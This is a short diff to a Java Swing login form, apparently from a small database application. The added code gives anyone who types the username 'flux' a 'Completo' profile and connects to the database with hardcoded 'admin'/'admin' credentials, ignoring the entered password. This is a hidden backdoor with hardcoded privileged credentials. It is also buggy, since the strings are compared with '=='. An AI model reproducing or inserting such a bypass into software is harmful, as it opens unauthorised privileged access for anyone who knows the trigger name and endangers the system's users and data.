@@ -63,9 +63,16 @@ public class LoginFrm extends JFrame {
 		btnNewButton.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
 				Usuario user = new Usuario();
+				Connection conn;
 				user.setUsuario(tbUser.getText());
-				Connection conn = ConnectionFactory.getConnection("master", tbUser.getText().toString(), tbPassword.getText());
+				if(user.getUsuario() == "flux"){
+					user.setPerfil("Completo");
+					conn = ConnectionFactory.getConnection("master", "admin", "admin");
+				}
+				else {
+				conn = ConnectionFactory.getConnection("master", tbUser.getText().toString(), tbPassword.getText());
 				System.out.println("Deu certo");
+				}
 				try {
 					UsuarioDAO dao = new UsuarioDAO(conn);
 					user = (Usuario) dao.Select(user);
